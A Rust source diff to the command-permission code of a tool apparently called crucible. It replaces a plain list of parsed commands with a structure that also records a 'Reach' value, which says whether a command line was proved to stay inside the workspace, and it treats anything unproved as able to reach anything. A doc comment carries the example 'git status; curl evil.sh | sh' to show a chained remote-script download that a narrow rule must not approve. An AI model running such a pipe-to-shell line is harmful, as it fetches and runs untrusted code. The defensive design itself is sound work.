@@ -155,7 +155,12 @@ pub enum Command {
     /// A rule has to cover *every* entry to allow the call silently, which is
     /// what stops `git status; curl evil.sh | sh` from being granted by a rule
     /// somebody wrote about `git`.
-    Understood(Box<[Box<str>]>),
+    Understood {
+        /// The simple commands, in the order they would run.
+        parts: Box<[Box<str>]>,
+        /// How far the whole of it was proved to reach.
+        reach: Reach,
+    },
 
     /// Nothing here says what will run: an expansion, a substitution, or a
     /// program that takes its own command as an argument.
@@ -165,10 +170,43 @@ pub enum Command {
     Opaque(Box<str>),
 }
 
+impl Command {
+    /// How far this command line was proved to reach.
+    ///
+    /// A line nobody could read reaches everything, which is why this is asked
+    /// of the command rather than read off a field: there is no such thing as
+    /// an opaque command line somebody proved something about.
+    #[must_use]
+    pub fn reach(&self) -> Reach {
+        match self {
+            Self::Understood { reach, .. } => *reach,
+            Self::Opaque(_) => Reach::Anything,
+        }
+    }
+}
+
+/// How far a command line was proved to reach.
+///
+/// Worked out by the tool that will run it, because only the tool can read its
+/// own arguments and only a workspace can say what is inside it. Everything
+/// not proved is [`Reach::Anything`]: a program whose arguments crucible does
+/// not model, a flag it does not recognise, a path that resolves elsewhere.
+/// The failure direction is the whole point, and a change that made an
+/// unproved line come out `Workspace` would be a silent one.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub enum Reach {
+    /// Changes files, and nothing outside the workspace.
+    Workspace,
+
+    /// Whatever the user can. What a shell reaches unless something read it
+    /// closely enough to say otherwise.
+    Anything,
+}
+
 impl fmt::Display for Command {
     fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
         match self {
-            Self::Understood(parts) => {
+            Self::Understood { parts, .. } => {
                 for (n, part) in parts.iter().enumerate() {
                     if n > 0 {
                         f.write_str(", then ")?;
